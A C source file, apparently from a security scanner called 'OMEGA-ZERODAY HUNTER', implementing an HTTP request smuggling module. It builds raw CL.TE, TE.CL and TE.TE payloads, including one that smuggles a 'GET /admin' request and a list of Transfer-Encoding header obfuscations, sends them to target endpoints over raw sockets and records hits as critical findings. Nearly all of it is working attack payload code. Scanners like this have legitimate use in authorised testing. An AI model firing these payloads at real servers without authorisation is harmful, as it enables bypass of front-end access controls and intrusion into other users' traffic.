/*
 * OMEGA-ZERODAY HUNTER v2.0 — HTTP Request Smuggling Engine
 * Real CL.TE, TE.CL, TE.TE detection via raw sockets
 */

#include "../include/omega.h"

int smuggle_clte(const endpoint_t *ep, scan_context_t *ctx) {
    parsed_url_t parsed;
    url_parse(ep->url, &parsed);
    
    /* CL.TE payload: Content-Length says X, Transfer-Encoding says chunked */
    /* The front-end uses CL, back-end uses TE — smuggled request hidden in chunk */
    char payload[2048];
    int len = snprintf(payload, sizeof(payload),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: %s\r\n"
        "\r\n",
        ep->path, ep->url, ep->url);
    
    char response[4096];
    int resp_len = smuggle_raw_send(parsed.host, parsed.port, parsed.ssl,
                                     payload, len, response, sizeof(response));
    
    if (resp_len > 0) {
        /* Check if we got a response to the smuggled request */
        if (str_contains(response, "200 OK") && str_contains(response, "admin")) {
            if (ctx->finding_count < OMEGA_MAX_FINDINGS) {
                finding_t *f = &ctx->findings[ctx->finding_count];
                memset(f, 0, sizeof(finding_t));
                f->type = FIND_SMUGGLE_CLTE;
                f->severity = SEV_CRITICAL;
                f->cvss_score = 9.0;
                strncpy(f->url, ep->url, OMEGA_MAX_URL_LEN - 1);
                strcpy(f->description, "HTTP Request Smuggling: CL.TE — Front-end uses Content-Length, back-end uses Transfer-Encoding");
                strcpy(f->evidence, "Smuggled GET /admin received 200 OK response");
                f->confidence = 0.85;
                strncpy(f->cwe_id, "CWE-444", sizeof(f->cwe_id) - 1);
                strncpy(f->engine, "SmuggleHunter", sizeof(f->engine) - 1);
                f->timestamp = time_now();
                ctx->finding_count++;
                ctx->critical_count++;
                log_info("🔴 CRITICAL: CL.TE smuggling at %s", ep->url);
            }
        }
    }
    return 0;
}

int smuggle_tecl(const endpoint_t *ep, scan_context_t *ctx) {
    parsed_url_t parsed;
    url_parse(ep->url, &parsed);
    
    /* TE.CL: Transfer-Encoding (with obfuscation) + Content-Length */
    char payload[2048];
    int len = snprintf(payload, sizeof(payload),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "8\r\n"
        "SMUGGLED\r\n"
        "0\r\n"
        "\r\n",
        ep->path, ep->url);
    
    char response[4096];
    int resp_len = smuggle_raw_send(parsed.host, parsed.port, parsed.ssl,
                                     payload, len, response, sizeof(response));
    
    if (resp_len > 0 && str_contains(response, "SMUGGLED")) {
        if (ctx->finding_count < OMEGA_MAX_FINDINGS) {
            finding_t *f = &ctx->findings[ctx->finding_count];
            memset(f, 0, sizeof(finding_t));
            f->type = FIND_SMUGGLE_TECL;
            f->severity = SEV_CRITICAL;
            f->cvss_score = 9.0;
            strncpy(f->url, ep->url, OMEGA_MAX_URL_LEN - 1);
            strcpy(f->description, "HTTP Request Smuggling: TE.CL — Back-end uses Transfer-Encoding");
            strcpy(f->evidence, "Smuggled content 'SMUGGLED' found in response");
            f->confidence = 0.85;
            strncpy(f->cwe_id, "CWE-444", sizeof(f->cwe_id) - 1);
            strncpy(f->engine, "SmuggleHunter", sizeof(f->engine) - 1);
            f->timestamp = time_now();
            ctx->finding_count++;
            ctx->critical_count++;
            log_info("🔴 CRITICAL: TE.CL smuggling at %s", ep->url);
        }
    }
    return 0;
}

int smuggle_tete(const endpoint_t *ep, scan_context_t *ctx) {
    parsed_url_t parsed;
    url_parse(ep->url, &parsed);
    
    /* TE.TE with obfuscation: X-Transfer-Encoding trick */
    const char *obfuscations[] = {
        "Transfer-Encoding", "Transfer Encoding",
        "Transfer-Encoding:", " Transfer-Encoding",
        "Transfer-Encoding\t:", "X-Transfer-Encoding",
        "Transfer-Encoding\t", "Transfer\nEncoding",
        NULL
    };
    
    for (int i = 0; obfuscations[i]; i++) {
        char payload[2048];
        int len = snprintf(payload, sizeof(payload),
            "POST %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 3\r\n"
            "%s: chunked\r\n"
            "\r\n"
            "8\r\n"
            "SMUGGLED\r\n"
            "0\r\n"
            "\r\n",
            ep->path, ep->url, obfuscations[i]);
        
        char response[4096];
        int resp_len = smuggle_raw_send(parsed.host, parsed.port, parsed.ssl,
                                         payload, len, response, sizeof(response));
        
        if (resp_len > 0 && str_contains(response, "SMUGGLED")) {
            if (ctx->finding_count < OMEGA_MAX_FINDINGS) {
                finding_t *f = &ctx->findings[ctx->finding_count];
                memset(f, 0, sizeof(finding_t));
                f->type = FIND_SMUGGLE_TETE;
                f->severity = SEV_CRITICAL;
                f->cvss_score = 9.2;
                strncpy(f->url, ep->url, OMEGA_MAX_URL_LEN - 1);
                snprintf(f->description, sizeof(f->description),
                    "HTTP Request Smuggling: TE.TE with obfuscation via '%s'", obfuscations[i]);
                snprintf(f->evidence, sizeof(f->evidence),
                    "Obfuscation: %s | Response contained smuggled content", obfuscations[i]);
                f->confidence = 0.88;
                strncpy(f->cwe_id, "CWE-444", sizeof(f->cwe_id) - 1);
                strncpy(f->engine, "SmuggleHunter", sizeof(f->engine) - 1);
                f->timestamp = time_now();
                ctx->finding_count++;
                ctx->critical_count++;
                log_info("🔴 CRITICAL: TE.TE smuggling at %s (obf: %s)", ep->url, obfuscations[i]);
            }
            return 1;
        }
    }
    return 0;
}

int smuggle_run(scan_context_t *ctx) {
    if (!ctx) return -1;
    log_info("🚀 SmuggleHunter: Testing for HTTP Request Smuggling...");
    
    int tested = 0;
    for (int i = 0; i < ctx->endpoint_count && i < 10; i++) {
        if (ctx->endpoints[i].status_code >= 400) continue;
        tested++;
        if (ctx->progress_callback)
            ctx->progress_callback("SmuggleHunter", tested, 10, ctx->endpoints[i].path);
        
        smuggle_clte(&ctx->endpoints[i], ctx);
        smuggle_tecl(&ctx->endpoints[i], ctx);
        smuggle_tete(&ctx->endpoints[i], ctx);
    }
    
    log_info("🚀 SmuggleHunter: Completed %d endpoint tests", tested);
    return 0;
}
